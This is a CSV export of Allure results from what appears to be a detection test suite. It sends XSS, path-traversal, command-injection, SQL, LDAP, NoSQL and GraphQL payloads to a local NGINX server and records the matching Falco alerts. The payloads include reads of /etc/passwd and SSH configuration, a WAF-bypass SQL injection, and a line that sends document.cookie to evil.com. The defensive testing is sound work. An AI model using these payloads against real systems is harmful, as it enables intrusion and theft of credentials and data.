"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ENC_001` |
| **Name** | HTML entity encoded script tag |
| **Category** | XSS |
| **Subcategory** | encoding_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `&#60;script&#62;alert(1)&#60;/script&#62;`
- **Encoded**: `%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B%2Fscript%26%2362%3B`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 01:33:15.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_001-1767403995744-vlo95 pattern_id=XSS_ENC_001 uri=/?q=%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B%2Fscript%26%2362%3B client=127.0.0.1 method=GET

**Falco Log Entry**:
```
01:33:15.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_001-1767403995744-vlo95 pattern_id=XSS_ENC_001 uri=/?q=%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B%2Fscript%26%2362%3B client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[076_XSS_ENC_001]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_006` |
| **Name** | Apache site configuration access |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `/etc/apache2/sites-available/000-default.conf`
- **Encoded**: `%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~28000ms
- **Timestamp**: 01:33:26.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1767404006757-t1oy4 pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1

**Falco Log Entry**:
```
01:33:26.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1767404006757-t1oy4 pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1
```","1","test_e2e_with_logs[106_PATH_ABS_006]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DBL_001` |
| **Name** | Double URL encoded dot-dot-slash |
| **Category** | PATH |
| **Subcategory** | double_encoded |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%252E%252E%252F`
- **Encoded**: `%25252E%25252E%25252F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~28000ms
- **Timestamp**: 01:33:26.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_DBL_001-1767404006256-kywm9s pattern_id=PATH_DBL_001 uri=/?q=%25252E%25252E%25252F client=127.0.0.1

**Falco Log Entry**:
```
01:33:26.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_DBL_001-1767404006256-kywm9s pattern_id=PATH_DBL_001 uri=/?q=%25252E%25252E%25252F client=127.0.0.1
```","2","test_e2e_with_logs[120_PATH_DBL_001]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_003` |
| **Name** | Hosts file access via path traversal |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../etc/hosts`
- **Encoded**: `../../../etc/hosts`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~38000ms
- **Timestamp**: 01:33:16.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_003-1767403996737-b1mnp pattern_id=PATH_DOT_003 uri=/?q=../../../etc/hosts client=127.0.0.1

**Falco Log Entry**:
```
01:33:16.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_003-1767403996737-b1mnp pattern_id=PATH_DOT_003 uri=/?q=../../../etc/hosts client=127.0.0.1
```","2","test_e2e_with_logs[123_PATH_DOT_003]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BLIND_005` |
| **Name** | LDAP description field enumeration |
| **Category** | LDAP |
| **Subcategory** | blind_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `*)(description=*secret*)`
- **Encoded**: `*)(description%3D*secret*)`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 01:33:32.000 UTC

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_005-1767404012739-b6dqi pattern_id=LDAP_BLIND_005 uri=/?q=*)(description%3D*secret*) client=127.0.0.1

**Falco Log Entry**:
```
01:33:32.000000000: Critical [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_005-1767404012739-b6dqi pattern_id=LDAP_BLIND_005 uri=/?q=*)(description%3D*secret*) client=127.0.0.1
```","1","test_e2e_with_logs[197_LDAP_BLIND_005]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_010` |
| **Name** | MySQL config access via traversal |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../etc/mysql/my.cnf`
- **Encoded**: `../../../etc/mysql/my.cnf`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 01:33:20.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_010-1767404000245-cvr8ie pattern_id=PATH_DOT_010 uri=/?q=../../../etc/mysql/my.cnf client=127.0.0.1

**Falco Log Entry**:
```
01:33:20.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_010-1767404000245-cvr8ie pattern_id=PATH_DOT_010 uri=/?q=../../../etc/mysql/my.cnf client=127.0.0.1
```","1","test_e2e_with_logs[130_PATH_DOT_010]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_009` |
| **Name** | Window.open DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `window.open('javascript:alert(""DOM"")')`
- **Encoded**: `window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~29000ms
- **Timestamp**: 01:33:25.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_009-1767404005264-heui08 pattern_id=XSS_DOM_009 uri=/?q=window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
01:33:25.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_009-1767404005264-heui08 pattern_id=XSS_DOM_009 uri=/?q=window.open%28%27javascript%3Aalert%28%22DOM%22%29%27%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[074_XSS_DOM_009]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_004` |
| **Name** | innerHTML DOM XSS |
| **Category** | XSS |
| **Subcategory** | dom_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `innerHTML='<img src=x onerror=alert(""DOM"")>'`
- **Encoded**: `innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(%22DOM%22)%3E'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 01:33:20.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_004-1767404000756-4gd3jf pattern_id=XSS_DOM_004 uri=/?q=innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(%22DOM%22)%3E' client=127.0.0.1 method=GET

**Falco Log Entry**:
```
01:33:20.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_004-1767404000756-4gd3jf pattern_id=XSS_DOM_004 uri=/?q=innerHTML%3D'%3Cimg%20src%3Dx%20onerror%3Dalert(%22DOM%22)%3E' client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[069_XSS_DOM_004]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_SUB_003` |
| **Name** | Password file via command substitution |
| **Category** | CMDINJ |
| **Subcategory** | command_substitution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$(cat /etc/passwd)`
- **Encoded**: `%24%28cat%20%2Fetc%2Fpasswd%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~20000ms
- **Timestamp**: 01:33:34.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_SUB_003-1767404014262-nkm6u pattern_id=CMD_SUB_003 uri=/?q=%24%28cat%20%2Fetc%2Fpasswd%29 client=127.0.0.1

**Falco Log Entry**:
```
01:33:34.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_SUB_003-1767404014262-nkm6u pattern_id=CMD_SUB_003 uri=/?q=%24%28cat%20%2Fetc%2Fpasswd%29 client=127.0.0.1
```","2","test_e2e_with_logs[177_CMD_SUB_003]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_004` |
| **Name** | Background execution with ps |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `& ps aux`
- **Encoded**: `%26%20ps%20aux`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~35000ms
- **Timestamp**: 01:33:19.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_004-1767403999731-k39wau pattern_id=CMD_BASIC_004 uri=/?q=%26%20ps%20aux client=127.0.0.1

**Falco Log Entry**:
```
01:33:19.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_004-1767403999731-k39wau pattern_id=CMD_BASIC_004 uri=/?q=%26%20ps%20aux client=127.0.0.1
```","1","test_e2e_with_logs[145_CMD_BASIC_004]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_003` |
| **Name** | OR operator with id command |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `|| id`
- **Encoded**: `%7C%7C%20id`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~35000ms
- **Timestamp**: 01:33:19.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_003-1767403999230-vd98g pattern_id=CMD_BASIC_003 uri=/?q=%7C%7C%20id client=127.0.0.1

**Falco Log Entry**:
```
01:33:19.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_003-1767403999230-vd98g pattern_id=CMD_BASIC_003 uri=/?q=%7C%7C%20id client=127.0.0.1
```","1","test_e2e_with_logs[144_CMD_BASIC_003]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_014` |
| **Name** | Sleep with inline comment |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `SLEEP(/*5*/5)`
- **Encoded**: `SLEEP%28/%2A5%2A/5%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~45000ms
- **Timestamp**: 01:33:09.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1767403989743-xjfz54q pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
01:33:09.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_014-1767403989743-xjfz54q pattern_id=SQLI_TIME_014 uri=/?q=SLEEP%28/%2A5%2A/5%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[048_SQLI_TIME_014]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_SUB_004` |
| **Name** | System info via backtick substitution |
| **Category** | CMDINJ |
| **Subcategory** | command_substitution |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: ``uname -a``
- **Encoded**: `%60uname%20-a%60`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~20000ms
- **Timestamp**: 01:33:34.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_SUB_004-1767404014764-ap21w6 pattern_id=CMD_SUB_004 uri=/?q=%60uname%20-a%60 client=127.0.0.1

**Falco Log Entry**:
```
01:33:34.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_SUB_004-1767404014764-ap21w6 pattern_id=CMD_SUB_004 uri=/?q=%60uname%20-a%60 client=127.0.0.1
```","2","test_e2e_with_logs[178_CMD_SUB_004]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_007` |
| **Name** | SUBSTRING-based boolean injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND SUBSTRING(username,1,1)='a`
- **Encoded**: `'%20AND%20SUBSTRING(username%2C1%2C1)%3D'a`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~39000ms
- **Timestamp**: 01:33:15.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_007-1767403995256-x7mav6 pattern_id=SQLI_BOOL_007 uri=/?q='%20AND%20SUBSTRING(username%2C1%2C1)%3D'a client=127.0.0.1 method=GET

**Falco Log Entry**:
```
01:33:15.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_007-1767403995256-x7mav6 pattern_id=SQLI_BOOL_007 uri=/?q='%20AND%20SUBSTRING(username%2C1%2C1)%3D'a client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[014_SQLI_BOOL_007]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_005` |
| **Name** | SSH config access via traversal |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../../../etc/ssh/sshd_config`
- **Encoded**: `../../../../../etc/ssh/sshd_config`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~37000ms
- **Timestamp**: 01:33:17.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_005-1767403997740-xoe1df pattern_id=PATH_DOT_005 uri=/?q=../../../../../etc/ssh/sshd_config client=127.0.0.1

**Falco Log Entry**:
```
01:33:17.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_005-1767403997740-xoe1df pattern_id=PATH_DOT_005 uri=/?q=../../../../../etc/ssh/sshd_config client=127.0.0.1
```","1","test_e2e_with_logs[125_PATH_DOT_005]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BYPASS_001` |
| **Name** | MySQL version comment WAF bypass |
| **Category** | SQLI |
| **Subcategory** | bypass_waf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/*!50000 UNION*/ /*!50000 SELECT*/ version(),NULL,NULL --`
- **Encoded**: `%21*50000%20UNION*%2F%20%21*50000%20SELECT*%2F%20version()%2CNULL%2CNULL%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 01:33:20.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_001-1767404000269-ado8rr pattern_id=SQLI_BYPASS_001 uri=/?q=%21*50000%20UNION*%2F%20%21*50000%20SELECT*%2F%20version()%2CNULL%2CNULL%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
01:33:20.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_001-1767404000269-ado8rr pattern_id=SQLI_BYPASS_001 uri=/?q=%21*50000%20UNION*%2F%20%21*50000%20SELECT*%2F%20version()%2CNULL%2CNULL%20-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[015_SQLI_BYPASS_001]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_001` |
| **Name** | document.location manipulation |
| **Category** | XSS |
| **Subcategory** | dom_based_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `document.location='http://evil.com/?c='+document.cookie`
- **Encoded**: `document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~37000ms
- **Timestamp**: 01:33:17.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1767403997248-idvtw pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET

**Falco Log Entry**:
```
01:33:17.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1767403997248-idvtw pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[066_XSS_DOM_001]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `NOSQL_COUCH_002` |
| **Name** | CouchDB design document view access |
| **Category** | NOSQL_EXTENDED |
| **Subcategory** | couchdb |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `_design/test/_view/all`
- **Encoded**: `_design%2Ftest%2F_view%2Fall`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~1000ms
- **Timestamp**: 01:33:53.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_COUCH_002-1767404033728-j07rbe pattern_id=NOSQL_COUCH_002 uri=/?q=_design%2Ftest%2F_view%2Fall client=127.0.0.1

**Falco Log Entry**:
```
01:33:53.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=NOSQL_COUCH_002-1767404033728-j07rbe pattern_id=NOSQL_COUCH_002 uri=/?q=_design%2Ftest%2F_view%2Fall client=127.0.0.1
```","1","test_e2e_with_logs[200_NOSQL_COUCH_002]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `GQL_INTRO_003` |
| **Name** | GraphQL mutation schema access |
| **Category** | GRAPHQL |
| **Subcategory** | introspection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `mutation{__schema{queryType{name}}}`
- **Encoded**: `mutation%7B__schema%7BqueryType%7Bname%7D%7D%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~15000ms
- **Timestamp**: 01:33:39.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Template injection test_id=GQL_INTRO_003-1767404019230-icj3bn pattern_id=GQL_INTRO_003 uri=/?q=mutation%7B__schema%7BqueryType%7Bname%7D%7D%7D client=127.0.0.1

**Falco Log Entry**:
```
01:33:39.000000000: Critical [NGINX Emerging Threat] Template injection test_id=GQL_INTRO_003-1767404019230-icj3bn pattern_id=GQL_INTRO_003 uri=/?q=mutation%7B__schema%7BqueryType%7Bname%7D%7D%7D client=127.0.0.1
```","2","test_e2e_with_logs[212_GQL_INTRO_003]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_005` |
| **Name** | Timeout-based command execution |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `&& timeout 15 bash`
- **Encoded**: `%26%26%20timeout%2015%20bash`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~22000ms
- **Timestamp**: 01:33:32.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BLIND_005-1767404012758-ektzp pattern_id=CMD_BLIND_005 uri=/?q=%26%26%20timeout%2015%20bash client=127.0.0.1

**Falco Log Entry**:
```
01:33:32.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BLIND_005-1767404012758-ektzp pattern_id=CMD_BLIND_005 uri=/?q=%26%26%20timeout%2015%20bash client=127.0.0.1
```","1","test_e2e_with_logs[167_CMD_BLIND_005]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_004` |
| **Name** | Authentication log access |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/var/log/auth.log`
- **Encoded**: `/var/log/auth.log`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 01:33:22.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_004-1767404002249-a3c1qe pattern_id=PATH_ABS_004 uri=/?q=/var/log/auth.log client=127.0.0.1

**Falco Log Entry**:
```
01:33:22.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_004-1767404002249-a3c1qe pattern_id=PATH_ABS_004 uri=/?q=/var/log/auth.log client=127.0.0.1
```","1","test_e2e_with_logs[104_PATH_ABS_004]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_006` |
| **Name** | System information gathering |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `; uname -a`
- **Encoded**: `%3B%20uname%20-a`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~34000ms
- **Timestamp**: 01:33:20.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_006-1767404000733-ybzl6r pattern_id=CMD_BASIC_006 uri=/?q=%3B%20uname%20-a client=127.0.0.1

**Falco Log Entry**:
```
01:33:20.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_006-1767404000733-ybzl6r pattern_id=CMD_BASIC_006 uri=/?q=%3B%20uname%20-a client=127.0.0.1
```","2","test_e2e_with_logs[147_CMD_BASIC_006]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_POLY_001` |
| **Name** | Universal XSS polyglot |
| **Category** | XSS |
| **Subcategory** | polyglot_xss |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+alert('XSS');//'>`
- **Encoded**: `javascript%3A%2F*--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D'%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B*%2F%5B%5D%2F%2Balert('XSS')%3B%2F%2F'%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~35000ms
- **Timestamp**: 01:33:19.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_001-1767403999754-saax0n pattern_id=XSS_POLY_001 uri=/?q=javascript%3A%2F*--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D'%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B*%2F%5B%5D%2F%2Balert('XSS')%3B%2F%2F'%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
01:33:19.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_POLY_001-1767403999754-saax0n pattern_id=XSS_POLY_001 uri=/?q=javascript%3A%2F*--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D'%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B*%2F%5B%5D%2F%2Balert('XSS')%3B%2F%2F'%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[084_XSS_POLY_001]","allure","2026-01-03","passed","2026-01-03","","test_e2e_wrapper","",""
